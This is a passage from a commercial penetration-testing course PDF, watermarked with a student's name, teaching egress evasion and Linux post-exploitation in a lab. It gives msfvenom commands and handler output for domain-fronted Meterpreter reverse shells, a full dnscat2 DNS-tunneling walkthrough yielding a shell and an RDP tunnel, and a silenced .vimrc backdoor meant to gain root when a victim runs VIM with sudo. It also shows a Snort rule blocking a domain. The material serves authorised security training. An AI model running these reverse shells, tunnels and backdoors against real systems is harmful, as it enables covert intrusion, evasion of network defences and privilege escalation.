[-] Handler failed to bind to 152.199.19.161:80 
[*] Started HTTP reverse handler on http://0.0.0.0:80 
Listing 414 - Setting up Meterpreter reverse HTTP shell listener 
Metasploit will display an error that it failed to bind to 152.199.19.161 because it’s the address of 
the original domain (do.skype.com), which is not hosted on our machine. However, Metasploit will 
failover and bind to all local interfaces. 
Before we execute our payload, let’s start Wireshark so we can inspect the traffic details. 
Finally, we’ll execute our payload. 
msf5 exploit(multi/handler) >  
[*] http://do.skype.com:80 handling request from 152.195.142.158; (UUID: mbgovmvr) 
Staging python payload (53985 bytes) ... 
[*] Meterpreter session 3 opened (138.68.99.177:80 -> 152.195.142.158:54524) 
 
msf5 exploit(multi/handler) > sessions -i 3 
[*] Starting interaction with 3... 
 
meterpreter > getuid  
Server username: offsec 
Listing 415 - Meterpreter reverse HTTP shell with domain fronting 
Very Nice. Our shell appears to be working perfectly. 
Let’s inspect our traffic in Wireshark to make sure the connection worked as expected. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
358 
 
Figure 156: HTTP domain fronting with do.skype.com 
Based on the TCP packets, the shell connected to 152.199.19.161, the IP address of 
do.skype.com. Let’s take a look at the Host request headers with Follow TCP Stream. 
 
Figure 157: HTTP domain fronting with do.skype.com 
The HTTP Host headers are also set to offensive-security-azureedge.net. This verifies that our 
reverse shell worked via domain fronting. Excellent! 
In this section, we demonstrated an Azure domain fronting scenario. We set up a CDN, configured 
our Meterpreter shell with extra parameters to work with domain fronting, and analyzed the 
packets to view and confirm that our fronting setup worked as expected. Although this was a real-
world scenario that we can’t replicate in the lab, in the next section we’ll show a simplified setup 
that will allow us to practice these concepts. 
9.6.1.1 Exercise 
1. 
Use FindFrontableDomains to locate additional domains that can be used for domain 
fronting. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
359 
9.6.1.2 Extra Mile 
Censys is a search engine similar to Shodan, searching Internet-connected devices based on their 
fingerprint information, like webserver type, certificate details, etc. Use this service to find Azure 
domain-frontable sites. The following guide551 will show the necessary steps. 
9.6.2 Domain Fronting in the Lab 
In this exercise, we will practice domain fronting in our lab environment. Our goal will be to use 
the trusted good.com domain to reach the otherwise blocked bad.com domain. Our CDN 
hostname will be cdn123.offseccdn.com, which will point to the IP address of bad.com. 
Since we don’t have Internet connectivity in the lab, we’ll emulate this environment and describe 
the setup. 
Figure 158 below outlines the lab design. 
 
Figure 158: Lab setup for domain fronting 
The DNS server (dnsmasq552) is running on the Ubuntu machine, which also runs Snort. We also 
use an NGINX webserver, which will be used to simulate the CDN network. 
In order to use dnsmasq for name resolution, we will need to configure IP-to-domain mapping in 
the /etc/hosts file. 
Our configuration is shown in Listing 416. 
127.0.0.1       localhost 
127.0.1.1       ips 
172.16.51.21 good.com 
 
551 (theobsidiantower.com, 2017), https://theobsidiantower.com/2017/07/24/d0a7cfceedc42bdf3a36f2926bd52863ef28befc.html 
552 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Dnsmasq 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
360 
192.168.119.120 bad.com 
172.16.51.21 cdn123.offseccdn.com 
Listing 416 - /etc/hosts file 
We need to update the entry for bad.com to point to our Kali machine. 
For the change to take effect, we need to restart both dnsmasq and nginx as shown in Listing 
417. 
offsec@ubuntu:~$ sudo systemctl restart dnsmasq 
offsec@ubuntu:~$ sudo systemctl restart nginx 
Listing 417 - Restart dnsmasq and nginx 
In this example, good.com is considered safe for client access. The bad.com domain is blocked 
by Snort, which will drop all DNS queries using this snort rule: 
drop udp any any -> any 53 (msg:"VIRUS DNS query for malicious bad.com domain"; 
content:"|01|"; offset:2; depth:1; content:"|00 01 00 00 00 00 00|"; distance:1; 
within:7; content:"|03|bad|03|com"; fast_pattern; classtype:bad-unknown; sid:2013482; 
rev:4;) 
Listing 418 - Snort rule to block bad.com domain 
This rule has a number of parameters that are relevant to us. 
The “drop udp any any -> any 53” section specifies that UDP traffic coming from any source IP, 
and any port, destined to any IP on port 53 (which is typically DNS) will be dropped if a rule match 
is detected. 
Furthermore, the rule itself contains a number of options that are used for match determinations. 
The msg option contains the message that Snort will return when a rule match is detected. While 
most of the other options in the rule shown in Figure 418 are not specifically relevant for this 
example, we do care about “content”. In our case, “content:”|03|bad|03|com"" indicates the domain 
name, which is bad.com. The “03” value specifies the length of the string that follows. This value 
is set for each part of the FQDN. As another example, if we wanted to match on google.com, we 
would instead use content:“|06|google|03|com”. 
We can test this setup from the Windows machine, by either trying to open bad.com in the 
browser, which will timeout, or making a domain lookup with nslookup. We can also look up the 
good.com domain to confirm that the DNS server is working. 
C:\Users\offsec> nslookup bad.com 
Server:  good.com 
Address:  172.16.51.21 
 
*** good.com can't find bad.com: No response from server 
 
C:\Users\offsec> nslookup good.com 
Server:  good.com 
Address:  172.16.51.21 
 
Name:    good.com 
Address:  172.16.51.21 
Listing 419 - Testing good.com and bad.com DNS lookups 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
361 
Since the NGINX server is also serving content for good.com, which in our example is a safe 
domain, the traffic destined for it will be allowed through. We can test the web server component 
by browsing good.com from the Windows VM. 
 
Figure 159: good.com served 
Finally, cdn123.offseccdn.com represents a CDN endpoint that is serving content for bad.com. 
To represent a CDN network, we configured NGINX as a reverse proxy for this domain so it 
forwards all requests to the bad.com domain. 
The configuration file related to this domain can be found on the Ubuntu machine at 
/etc/nginx/sites-available/cdn123.offseccdn.com: 
server { 
  listen 443 ssl; 
  server_name cdn123.offseccdn.com; 
  ssl_certificate     cdn.crt; 
  ssl_certificate_key cdn.key; 
 
  location / { 
         proxy_pass https://bad.com 
         proxy_ssl_verify off; 
   } 
} 
Listing 420 - NGINX configuration for cdn123.offseccdn.com 
The domain is configured with the proxy_pass setting. Since we are using self-signed certificates, 
we also need to set proxy_ssl_verify to “off”. 
To recap, the overall idea is that we will connect to the trusted good.com domain and use the 
cdn123.offseccdn.com domain in the HTTP Host header to access the domain bad.com. As both 
of these domains are served from the same machine, the request will be forwarded to our Kali 
machine. 
On our Kali machine, we’ll create our reverse HTTPS Meterpreter shell, where we set good.com as 
the LHOST and cdn123.offseccdn.com as the HttpHostHeader. We’ll also configure a listener to 
handle this shell. Note that here we will use a stageless payload, so we don’t need to configure 
the OverrideLHOST and OverrideRequestHost options we discussed in the previous section. 
kali@kali:~$ msfvenom -p windows/x64/meterpreter_reverse_https 
HttpHostHeader=cdn123.offseccdn.com LHOST=good.com LPORT=443 -f exe > https-df.exe 
Listing 421 - Create a HTTP reverse shell with msfvenom 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
362 
Next, we’ll transfer the payload to the victim and start a Wireshark capture so we can inspect 
traffic later. Finally, we’ll run the payload. 
msf5 exploit(multi/handler) > run 
 
[-] Handler failed to bind to 206.124.122.115:443 
[*] Started HTTPS reverse handler on https://0.0.0.0:443 
[*] https://good.com:443 handling request from 192.168.120.21; (UUID: gklf4zr8) 
Redirecting stageless connection from /565XLYsZVn16GXsbJTPhXw-
b83vlJF9C3018Kx2Qna04Mu7jN6LpH91I1kkDAww9cJHGlKu3zibA2e9ULmJ68e1ppmobSzbgMDuK2UIensZ3_
C-LWScAH3a5lve with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko' 
[*] https://good.com:443 handling request from 192.168.120.21; (UUID: gklf4zr8) 
Attaching orphaned/stageless session... 
[*] Meterpreter session 2 opened (192.168.119.120:443 -> 192.168.120.21:48490) 
 
meterpreter >  
Listing 422 - Getting HTTP reverse shell with domain fronting 
If everything was configured correctly, we should have a working reverse shell. 
Let’s inspect the traffic in Wireshark. We can apply a traffic filter to exclude all RDP traffic 
between our Kali machine and the Windows VM: 
!(tcp.port == 3389) 
Listing 423 - Wireshark Traffic Filter to Exclude RDP 
Next, let’s inspect the DNS request: 
 
Figure 160: DNS request to good.com 
Figure 160 shows the proper IP for good.com. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
363 
Next, we need to confirm that the client asked for the right certificate, which we can find in the 
TLS Client Hello packet, in the SNI field. 
 
Figure 161: TLS Client SNI to good.com 
The client did, in fact, properly set the SNI field to request the certificate from good.com. 
Finally, we’ll check the TLS Server Hello packet for the certificate: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
364 
 
Figure 162: TLS Server replies with certificate of good.com 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
365 
 
In this case, the Ubuntu NGINX server replied with the certificate of good.com. 
The rest of the traffic is encrypted but since we received our Meterpreter shell, we can confirm 
that it works properly. Very Nice. 
In this section, we performed domain fronting in the lab. We targeted our traffic to the good.com 
domain, which was hosted on the same server as cdn123.offseccdn.com. With the second 
domain being redirected to our Kali machine, we completely masked the target of our traffic. 
Although CDNs work differently in the real world, the impact and visibility of the traffic is the 
same. 
9.6.2.1 Exercises 
1. 
Repeat the steps above to perform a domain fronting attack in the lab. 
2. 
Perform the same attack for HTTP and inspect the HTTP packets for the correct Host 
header information. This NGINX configuration is available on the server: 
offsec@ubuntu:/etc/nginx/sites-available$ cat exercise.offseccdn.com  
server { 
  listen 80; 
  server_name exercise.offseccdn.com; 
   
  location / { 
         proxy_pass http://bad.com 
   } 
} 
Listing 424 - nginx server config for the exercise 
9.6.2.2 Extra Mile 
Perform domain fronting with PS Empire. 
9.7 DNS Tunneling 
DNS tunneling is a common technique used to bypass proxy, IPS, and firewall filters. This 
technique has limitations and is relatively slow due to the limited amount of data we can transfer 
in a single DNS packet. However, as DNS requests are typically allowed from even very restrictive 
environments, DNS tunneling can be an excellent technique to reach the outside world. In the next 
section, we’ll discuss how this technique works, and then perform DNS tunneling with dnscat2.553 
9.7.1 How DNS Tunneling Works 
In order to establish communication between two hosts using DNS traffic, we need to control 
both ends of the communication: the client that makes the requests, and the DNS server. This 
means that in order to receive the DNS requests generated by the client, we need to register our 
DNS server as the authoritative server for a given target domain, i.e. we need to assign an NS 
record to our domain. This typically means that we must purchase a domain and under its 
 
553 (Ron Bowes, 2019), https://github.com/iagox86/dnscat2 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
366 
configuration, set the NS record to our DNS tunnel server. This will cause the DNS server to 
forward all subdomain requests to our server. 
Once the infrastructure is in place, we can communicate between hosts by encapsulating our 
malicious data in legitimate DNS packets. 
From the client, we can encapsulate data into the name field, which contains the domain name. 
However, since the top-level domain is fixed, we can only encapsulate data as subdomains. These 
can be up to 63 characters long but the total length of a domain can’t exceed 253 characters.554 
From the server side, we have much more flexibility and can return data in a variety of fields 
based on the record type that was requested. An “A” record can only contain IPv4 addresses, 
which means we can only store four bytes of information, but “TXT” records allow up to 64k. 
However, one challenge in C2 communications is that if we want to send any data from the server 
to the client, we can’t initiate the transfer from the server. Therefore, the malicious client 
applications are designed to continuously poll the server for updated data. 
Let’s clarify this with a simple example. Imagine we want to create a C2 channel in which the 
server can issue commands and the client can return the results. Clients will continuously poll the 
server for new commands because the server can’t initiate connections to the client. The client 
will execute new commands and send the results via new query messages. Within these 
exchanges, we will generally hex-encode our data, which allows us to transfer custom data. 
Let’s walk through the specific steps involved in this example. 
First, as shown in Listing 425, the client will poll the server. 
Query: Request TXT record for "61726574686572656e6577636f6d6d616e6473.ourdomain.com" 
Listing 425 - Client polls the server via DNS TXT queries 
In this Listing, “61726574686572656e6577636f6d6d616e6473” represents the hex-encoded 
string of “aretherenewcommands”. If there is nothing to run, the server will return an empty TXT 
record. If there are commands to execute, the server will return the hex-encoded string of the 
command to be executed by the client. For example, to instruct the client to run the “hostname” 
command, the server would return this hex-encoded representation: 
TXT: "686f73746e616d65" 
Listing 426 - DNS Server responds with TXT record 
Next, the client executes the command and captures the results. In order to send the results, it 
will generate a new DNS lookup that includes the output of the requested command. In this case, 
the response would include the hex-encoded hostname (“client”) in the request. For example, 
“636c69656e74.ourdomain.com” The client could safely use a single “A” record lookup in this 
case due to the short response. If the response was longer, the client would use multiple DNS 
queries. 
This example is just a demonstration. Proper tunneling tools account for various issues such as 
DNS retransmission,555 in which the client resends queries because it didn’t receive an answer in 
 
554 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Subdomain 
555 (NS1., 2020), https://ns1.com/resources/dns-retransmission 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
367 
time, or DNS caching,556 in which the client caches the result of DNS queries. Full-featured tools 
can potentially tunnel arbitrary TCP/IP traffic (as opposed to the simple data in our example) and 
can also encrypt data. 
Now that we understand the basic concepts of tunneling, let’s try it out. 
9.7.2 DNS Tunneling with dnscat2 
dnscat2557 is a very popular and well-known DNS tunneling utility. It can tunnel traffic through 
multiple DNS records, such as A, TXT, and NS records. It also includes a built-in command shell 
and can tunnel custom IP traffic to multiple locations. In addition, we can run the dnscat2 client 
with standard user privileges as it does not require client-side drivers. 
To perform DNS tunneling with dnscat2, we need to perform some configuration on the Ubuntu 
machine, which will act as the lab’s primary DNS server. As noted in the previous section, all 
subdomain lookup requests for a specific domain should go to our DNS tunneling server, which 
acts as the authoritative name server for that domain. 
In the lab, we’ll use a simple dnsmasq DNS server and configure it to forward requests. We’ll use 
tunnel.com as an example domain for this demonstration. 
The following diagram visualizes the roles of each node in the DNS lab setup: 
 
Figure 163: TLS Server replies with certificate of good.com 
 
556 KeyCDN, 2020), https://www.keycdn.com/support/dns-cache 
557 (Ron Bowes, 2019), https://github.com/iagox86/dnscat2 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
368 
 
We’ll need to edit the /etc/dnsmasq.conf file on the Ubuntu machine and append our entries. We 
must specify the DNS servers for specific domains in a standard format and use the IP address 
of our Kali machine. 
server=/tunnel.com/192.168.119.120 
server=/somedomain.com/192.168.119.120 
Listing 427 - dnsmasq configuration 
After making the configuration changes, we must restart the dnsmasq service. 
offsec@ubuntu:~$ sudo systemctl restart dnsmasq 
Listing 428 - Restart dnsmasq 
Next we’ll install dnscat2 on our Kali machine. 
kali@kali:~$ sudo apt install dnscat2 
Listing 429 - Installing dnscat2 
At this point, we have to start dnscat2-server for our example tunnel.com domain. It will ask our 
password to elevate to root. 
kali@kali:~$ dnscat2-server tunnel.com  
 
New window created: 0 
New window created: crypto-debug 
Welcome to dnscat2! Some documentation may be out of date. 
 
auto_attach => false 
history_size (for new windows) => 1000 
Security policy changed: All connections must be encrypted 
New window created: dns1 
Starting Dnscat2 DNS server on 0.0.0.0:53 
[domains = tunnel.com]... 
 
Assuming you have an authoritative DNS server, you can run 
the client anywhere with the following (--secret is optional): 
 
  ./dnscat --secret=d3d2f452f24afe4b362df248e2906c1d tunnel.com 
 
To talk directly to the server without a domain name, run: 
 
  ./dnscat --dns server=x.x.x.x,port=53 --secret=d3d2f452f24afe4b362df248e2906c1d 
 
Of course, you have to figure out <server> yourself! Clients 
will connect directly on UDP port 53. 
Listing 430 - Starting dnscat2 server 
Next, we’ll switch to the Windows machine and start dnscat2 from the Desktop, specifying the 
domain we are using for the tunnel. 
C:\Users\offsec\Desktop> dnscat2-v0.07-client-win32.exe tunnel.com 
Creating DNS driver: 
 domain = tunnel.com 
 host   = 0.0.0.0 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
369 
 port   = 53 
 type   = TXT,CNAME,MX 
 server = 172.16.51.21 
 
Encrypted session established! For added security, please verify the server also 
displays this string: 
 
Pedal Envied Tore Frozen Pegged Ware 
 
Session established! 
Listing 431 - Starting dnscat2 client 
dnscat2 will encrypt connections by default, but we may also specify our own pre-shared key if 
we like. Once a connection is established, dnscat2 will display a “short authentication string”, 
which can be used to detect MiTM attacks. In this case, it’s “Pedal Envied Tore Frozen Pegged 
Ware”, which we need to verify on both sides. 
Switching back to the Kali side, we observe the following: 
dnscat2> New window created: 1 
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED 
For added security, please ensure the client displays the same string: 
 
>> Pedal Envied Tore Frozen Pegged Ware 
Listing 432 - dnscat2 session established 
We confirm that the authentication string is the same. 
We can start interacting with our client after attaching to the session using the session -i 
[number] command: 
dnscat2> session -i 1 
New window created: 1 
history_size (session) => 1000 
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED 
For added security, please ensure the client displays the same string: 
 
>> Pedal Envied Tore Frozen Pegged Ware 
This is a command session! 
 
That means you can enter a dnscat2 command such as 
'ping'! For a full list of clients, try 'help'. 
 
command (client) 1>  
Listing 433 - Attaching to dnscat2 session 
Next, we’ll run an interactive shell with the shell command. This will create a new session so we 
will need to switch to it in order to execute commands. 
command (client) 1> shell 
Sent request to execute a shell 
command (client) 1> New window created: 2 
Shell session created! 
 
command (client) 1> session -i 2 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
370 
New window created: 2 
history_size (session) => 1000 
Session 2 security: ENCRYPTED BUT *NOT* VALIDATED 
For added security, please ensure the client displays the same string: 
 
>> Zester Pulped Mousy Bogie Liming Tore 
This is a console session! 
 
That means that anything you type will be sent as-is to the 
client, and anything they type will be displayed as-is on the 
screen! If the client is executing a command and you don't 
see a prompt, try typing 'pwd' or something! 
 
To go back, type ctrl-z. 
 
Microsoft Windows [Version 10.0.18363.418] 
(c) 2019 Microsoft Corporation. All rights reserved. 
 
C:\Users\offsec\Desktop> 
cmd.exe (client) 2> whoami 
cmd.exe (client) 2> whoami 
client\offsec 
Listing 434 - Getting shell with dnscat2 
Our interactive shell is working flawlessly. Very nice. 
dnscat2 also supports TCP/IP tunnels over DNS. That means we can create a tunnel back to the 
victim machine so that we can RDP into it from our Kali system. 
Let’s try this by redirecting our local port 3389 to the Windows machine’s IP. 
command (client) 1> listen 127.0.0.1:3389 172.16.51.21:3389 
Listening on 127.0.0.1:3389, sending connections to 172.16.51.21:3389 
Listing 435 - Tunneling TCP with dnscat2 
Once the tunnel is created, we can rdesktop to our Kali host and interact with the RDP session 
on the Windows machine. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
371 
 
Figure 164: RDP session over DNS tunneling 
Since the traffic is tunneled over DNS, the session will be slow, but functional. 
Now that everything is working, let’s launch Wireshark and filter for DNS to inspect the DNS traffic 
hitting our Kali machine. 
 
Figure 165: DNS Tunneling as seen in Wireshark 
This is definitely “interesting” DNS traffic. Each of these requests contain very long and seemingly 
random domain names. If we look at the packet details, we can see that both the requests and 
the replies are quite lengthy, and that they include our hex-encoded traffic. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
372 
 
Figure 166: DNS Tunneling as seen in Wireshark 
Despite the fact that dnscat2 produces an anomalous DNS traffic pattern, it is still less 
anomalous than a standard command shell. 
9.7.2.1 Exercises 
1. 
Repeat the steps in the previous section to get a reverse shell. 
2. 
Tunnel SMB through the tunnel and access files on the Windows machine via DNS. 
9.8 Wrapping Up 
In this module, we discussed relatively advanced enterprise defensive layers. We discussed the 
strengths and weaknesses of a variety of solutions and presented a variety of bypass techniques. 
We also discussed three egress bypass techniques using HTTPS certificates, domain fronting, 
and DNS tunneling. Each of these approaches can be effective in a real-world environment and as 
penetration testers, we must carefully determine which approach best suits our target 
environment. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
373 
 
10 Linux Post-Exploitation 
Microsoft Windows is the predominant OS for workplace end-client machines and for everyday 
corporate technologies such as Active Directory and Kerberos. However, Linux (or a Unix variant) 
is widely regarded as having the majority share of the world’s servers and cloud environments, 
supercomputers, and IoT devices. Unix variants are also ubiquitous as a mobile operating system 
due to the Android operating system.558 Because of this, it’s helpful for penetration testers to have 
an extensive knowledge of Linux and how its unique functionality can benefit them during a 
security assessment. 
This module will cover several different topics related to penetration testing and Linux. We’ll 
present a variety of techniques that extend beyond initial enumeration and basic exploitation. 
The outcome of these techniques may vary depending on the type of Linux environment. As a 
result, we have attempted to make note of these particular idiosyncrasies within the text in the 
relevant sections. However, we will standardize our approaches on the lab machine for this 
module and the steps needed to exploit that particular environment. 
10.1 User Configuration Files 
Let’s start by discussing some background information about Linux configuration and its 
functionality, which will help set the groundwork for our exploits later on in this module. 
In Linux systems, applications frequently store user-specific configuration files and subdirectories 
within a user’s home directory. These files are often called “dotfiles”559 because they are 
prepended with a period. The prepended dot character tells the system not to display these files 
in basic file listings unless specifically requested by the user.560 
These configuration files control how applications behave for a specific user and are typically only 
writable by the user themselves or root. If we compromise a system under a given user, we can 
modify those files and change how applications behave for them. As a penetration tester, this 
provides us a useful attack vector. 
Two common examples of dotfiles are .bash_profile and .bashrc.561 These files specify settings to 
be used within a user’s shell session and the difference between them is subtle. .bash_profile is 
executed when logging in to the system initially. This happens when logging in to the machine 
itself, via a serial console or SSH. .bashrc is executed when a new terminal window is opened 
from an existing login session or when a new shell instance is started from an existing login 
session. 
We can modify .bash_profile or .bashrc to set environment variables or load scripts when a user 
initially logs in to a system. This can be useful when trying to maintain persistence, escalate 
privileges, or engage in other offensive activity. 
 
558 (Jovan Milenkovic , 2020), https://kommandotech.com/statistics/operating-system-market-share/ 
559 (Arch Linux, 2020), https://wiki.archlinux.org/index.php/Dotfiles 
560 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Hidden_file_and_hidden_directory#Unix_and_Unix-like_environments 
561 https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
374 
Let’s take a look at an example. In our lab machine, we’ll insert a simple command at the end of 
our user’s .bashrc. This will echo a touch command to write a file called bashtest.txt and append 
that to the end of the user’s .bashrc file. When the user begins a new shell session, our command 
will be executed. 
offsec@linuxvictim:~$ echo "touch /tmp/bashtest.txt" >> ~/.bashrc 
 
offsec@linuxvictim:~$ ls -al /tmp/bashtest.txt 
ls: cannot access '/tmp/bashtest.txt': No such file or directory 
 
offsec@linuxvictim:~$ /bin/bash 
 
offsec@linuxvictim:~$ ls -al /tmp/bashtest.txt  
-rw-rw-r-- 1 offsec offsec 0 Aug 26 15:19 /tmp/bashtest.txt 
 
offsec@linuxvictim:~$ exit 
offsec@linuxvictim:~$ 
Listing 436 - Inserting a command into the user’s .bashrc file 
The bashtest.txt file is not there at first, but once we start a new shell session by running 
/bin/bash, the command is executed. The file is then written to the /tmp directory as we expected. 
In the next section, we’ll use dotfiles to perform attacks and escalate privileges. 
10.1.1 
VIM Config Simple Backdoor 
In this section, we’ll continue our look at dotfiles by using the VIM text editor’s configuration file to 
backdoor the editor and exploit an unsuspecting user. 
The VIM editor562 is a widely used command line text editor on Linux and it (or its predecessor 
vi563) is installed on nearly all Unix and Linux systems by default. It is well known for its extensive 
functionality and, as a result, presents us with an opportunity for exploitation. 
On many Linux systems, user-specific VIM configuration settings are located in a user’s home 
directory in the .vimrc564 file. This file takes VIM-specific scripting commands565 and configures 
the VIM environment when a user starts the application. 
These commands can also be run from within the editor by typing a colon (:) character followed 
by the desired command. For example, if we want to print a message to the user, we can use the 
following command in the .vimrc file or within the editor. 
:echo "this is a test" 
Listing 437 - Running a simple VIM command 
 
562 (Vim.org, 2020), https://www.vim.org 
563 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Vi 
564 (Fandom.com, 2003), https://vim.fandom.com/wiki/Open_vimrc_file 
565 (Steve Losh, 2013), https://learnvimscriptthehardway.stevelosh.com 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
375 
Since VIM has access to the shell environment’s variables,566 we can use 
common ones like $USER to get the username or $UID to get the user’s ID 
number if desired. Later in this module we’ll leverage environment variables for 
privilege escalation. 
The commands specified in the .vimrc file are executed when VIM is launched. By editing this file, 
we can cause a user’s VIM session to perform unintended actions on their behalf when VIM is 
run. 
The first attack vector we’ll examine is running unauthorized scripts. If VIM is not set to use a 
restricted environment,567 then we can use it to run shell commands from within the config file by 
prepending the ! character. For example, if we want to create a file somewhere on the system, we 
can enter a bash command in the configuration file or in the VIM editor itself, prepended with an 
exclamation point. 
!touch /tmp/test.txt 
Listing 438 - Running a shell command through VIM 
By default, VIM allows shell commands but some hardened environments have 
VIM configured to restrict them. It’s possible to test attacks in this VIM 
environment by calling VIM with the -Z parameter on the command line. In this 
configuration, attempting to run a shell command will result in an error message 
indicating that such commands are not allowed. 
Putting our commands directly into the user’s .vimrc file isn’t particularly stealthy, as a user 
modifying their own settings may accidentally discover the changes we’ve made. There is, 
however, another option. 
We can “source” a shell script using the bash source command.568 This loads a specified shell 
script and runs it for us during the normal configuration process. 
This approach provides only a slight level of obfuscation since a user is less likely to dig deeper 
into these referenced files. 
We can also “import” other VIM configuration files into the user’s current config with the :source 
command.569 Note that the source call for loading a VIM configuration file is prepended with a 
colon and not an exclamation point, which is used for shell commands. 
 
566 (Mendel Cooper, 2014), http://tldp.org/LDP/abs/html/internalvariables.html 
567 (StackExchange, 2015), https://unix.stackexchange.com/questions/181492/why-is-it-risky-to-give-sudo-vim-access-to-ordinary-
users 
568 (Linuxize, 2020), https://linuxize.com/post/bash-source-command/ 
569 (Stack Overflow, 2009), https://stackoverflow.com/questions/803464/how-do-i-source-something-in-my-vimrc-file 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
376 
As a more stealthy approach, we can leverage the VIM plugin directory. As long as the files have a 
.vim extension, all VIM config files located in the user’s ~/.vim/plugin directory will be loaded 
when VIM is run. 
In our lab machine, let’s say we have compromised the offsec user, and we have a working shell. 
We can modify the user’s .vimrc file in their home directory (or create one if they don’t have it) and 
add the following line. 
!source ~/.vimrunscript 
Listing 439 - Sourcing a shell script in a VIM config file 
This will load and run a shell script called .vimrunscript from the user’s home directory. In a real-
world scenario, it might be useful to pick a file path outside the user’s home directory but for 
simplicity, we’ll keep it here. 
Next, we can create the shell script file at /home/offsec/.vimrunscript with the following contents. 
#!/bin/bash 
echo "hacked" > /tmp/hacksrcout.txt 
Listing 440 - Shell script to source from VIM 
The script echoes the word “hacked” to a file called /tmp/hacksrcout.txt. 
If we try to run VIM now, we get an obvious debug output message explaining that we’re sourcing 
a configuration file. 
offsec@linuxvictim:~$ vi /tmp/test.txt 
:!source /home/offsec/.vimrunscript 
 
Press ENTER or type command to continue 
Listing 441 - A debug message shown when sourcing a shell script in VIM 
This is obviously undesirable as it would tip off the user. Luckily, VIM has a built-in command for 
this, the :silent command. 
This command mutes any debug output which would normally be sent to the user when running 
VIM. We’ll change our line in the user’s .vimrc file to the following. 
:silent !source ~/.vimrunscript 
Listing 442 - Silencing the debug message 
We will remove the previous attempt’s /tmp/hacksrcout.txt file and try again. This time when we 
run VIM, our file opens, and we don’t get any suspicious messages. 
If we check the /tmp/ directory, we find that our test output file was created successfully. 
offsec@linuxvictim:~$ ls -al /tmp/hacksrcout.txt 
-rw-rw-r-- 1 offsec offsec 7 Jul  8 13:51 /tmp/hacksrcout.txt 
 
offsec@linuxvictim:~$ cat /tmp/hacksrcout.txt  
hacked 
Listing 443 - Our silenced sourced script created the output file successfully 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
377 
This is handy for triggering scripts when a user opens a file in VIM, but it doesn’t really give us 
much more access than we already have. We’ve got a shell as the user, so we can do most things 
they can. However, if the user has sudo access, we may be able to do more. 
In most cases, users with sudo rights are required to enter their password when performing 
activities with elevated permissions via the sudo command. We can’t perform activities as root 
via sudo because we don’t know the user’s password. We can weaponize this VIM vector to gain 
root privileges if the user runs VIM as root or uses the visudo command.570 
Note that VIM handles its configuration files differently for a user in a sudo context depending on 
the distribution of Linux. In some systems such as Ubuntu and Red Hat, VIM will use the current 
user’s .vimrc configuration file even in a sudo context. In other distributions, such as Debian, in a 
sudo context, VIM will use the root user’s VIM configuration. 
In an assessment on an Ubuntu, Red Hat, or similar system, if the user runs VIM via sudo, our 
script being sourced will also run as root. Because of this, we will achieve root access without any 
